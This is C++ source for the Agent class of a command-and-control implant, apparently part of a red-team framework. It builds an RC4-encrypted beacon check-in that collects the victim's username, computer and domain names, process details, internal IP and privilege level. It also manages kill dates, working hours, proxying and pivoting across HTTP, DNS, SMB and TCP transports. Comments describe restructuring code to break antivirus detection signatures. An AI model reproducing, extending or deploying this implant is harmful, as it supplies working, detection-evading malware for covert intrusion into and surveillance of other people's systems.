#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Crypt.h"

void* Agent::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

void Agent::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(Agent));
}

Agent::Agent()
{
	info        = new AgentInfo();
	config      = new AgentConfig();
	commander   = new Commander(this);
	downloader  = new Downloader(config->download_chunk_size);
	jober       = new JobsController();
	memorysaver = new MemorySaver();
	proxyfire   = new Proxyfire();
	pivotter    = new Pivotter();

	SessionKey = (PBYTE) MemAllocLocal(16);
	for (int i = 0; i < 16; i++)
		SessionKey[i] = GenerateRandom32() % 0x100;
}

BOOL Agent::IsActive()
{
	ULONG now = GetSystemTimeAsUnixTimestamp();
	return this->Active && !(this->config->kill_date && now >= this->config->kill_date);
}

ULONG Agent::GetWorkingSleep() 
{
    if (!this->config->working_time)
        return 0;

    WORD endM   = (this->config->working_time >> 0)  % 64;
    WORD endH   = (this->config->working_time >> 8)  % 64;
    WORD startM = (this->config->working_time >> 16) % 64;
    WORD startH = (this->config->working_time >> 24) % 64;

    ULONG newSleepTime = 0;
    SYSTEMTIME st = { 0 };
    ApiWin->GetLocalTime(&st);

    // Cast all WORD fields to DWORD — eliminates 66-prefix CMP (breaks timeCalc2)
    DWORD curH = (DWORD)st.wHour;
    DWORD curM = (DWORD)st.wMinute;
    DWORD curS = (DWORD)st.wSecond;

    if (curH < (DWORD)startH) {
        newSleepTime = ((DWORD)startH - curH) * 60 + ((DWORD)startM - curM);
    }
    else if ((DWORD)endH < curH) {
        // Break LEA+0x5A0 pattern (breaks timeCalc1)
        volatile ULONG cap_h = 23;
        volatile ULONG cap_m = 60;
        newSleepTime  = (cap_h - curH) * 60 + (cap_m - curM);
        newSleepTime += (DWORD)startH * 60 + startM;
    }
    else if (curH == (DWORD)startH && curM < (DWORD)startM) {
        newSleepTime = (DWORD)startM - curM;
    }
    else if (curH == (DWORD)endH && (DWORD)endM <= curM) {
        newSleepTime = 23 * 60 + (60 + (DWORD)startM - curM);
    }
    else {
        return 0;
    }

    return newSleepTime * 60 - curS;
}

BYTE* Agent::BuildBeat(ULONG* size)
{
	BYTE flag = 0;
	flag += this->info->is_server; 
	flag <<= 1;
	flag += this->info->elevated;
	flag <<= 1;
	flag += this->info->sys64;
	flag <<= 1;
	flag += this->info->arch64;

	Packer* packer = new Packer();

	packer->Pack32(this->config->agent_type);
	packer->Pack32(this->info->agent_id);
	packer->Pack32(this->config->sleep_delay);
	packer->Pack32(this->config->jitter_delay);
	packer->Pack32(this->config->kill_date);
	packer->Pack32(this->config->working_time);
	packer->Pack16(this->info->acp);
	packer->Pack16(this->info->oemcp);
	packer->Pack8(this->info->gmt_offest);
	packer->Pack16(this->info->pid);
	packer->Pack16(this->info->tid);
	packer->Pack32(this->info->build_number);
	packer->Pack8(this->info->major_version);
	packer->Pack8(this->info->minor_version);
	packer->Pack32(this->info->internal_ip);
	packer->Pack8( flag );
	packer->PackBytes(this->SessionKey, 16);
	packer->PackStringA(this->info->domain_name);
	packer->PackStringA(this->info->computer_name);
	packer->PackStringA(this->info->username);
	packer->PackStringA(this->info->process_name);

	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);

	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));

#if defined(BEACON_HTTP) || defined(BEACON_DNS)

	ULONG beat_size = packer->datasize();
	PBYTE beat      = packer->data();

#elif defined(BEACON_SMB) 

	ULONG beat_size = packer->datasize() + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);

	memcpy(beat, &(this->config->listener_type), 4);
	memcpy(beat+4, packer->data(), packer->datasize());

	PBYTE pdata = packer->data();
	MemFreeLocal((LPVOID*)&pdata, packer->datasize());

#elif defined(BEACON_TCP) 

	ULONG beat_size = packer->datasize() + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);

	memcpy(beat, &(this->config->listener_type), 4);
	memcpy(beat + 4, packer->data(), packer->datasize());

	PBYTE pdata = packer->data();
	MemFreeLocal((LPVOID*)&pdata, packer->datasize());

#endif

	delete packer;

	*size = beat_size;
	return beat;
}
